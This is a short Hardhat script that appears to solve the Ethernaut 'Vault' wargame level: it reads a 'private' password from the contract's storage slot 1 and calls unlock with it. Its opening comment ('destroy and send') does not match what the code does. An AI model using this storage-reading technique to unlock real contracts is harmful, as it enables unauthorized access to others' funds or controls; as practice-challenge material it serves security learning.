import { ethers } from "hardhat";

const ETHERNAUT_ADDRESS = "";

async function main() {
  // Get, destroy and send to the Ethernaut contract
  const Vault = await ethers.getContractFactory("Vault");
  const vault = await Vault.attach(ETHERNAUT_ADDRESS);
  console.log("Attach Vault contract at", vault.address);

  // Get the password in the storage of the contract
  const password = await ethers.provider.getStorageAt(ETHERNAUT_ADDRESS, 1);

  // Unlock the contract
  const tx = await vault.unlock(password);
  await tx.wait();
  console.log("Tx hash:", tx.hash);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
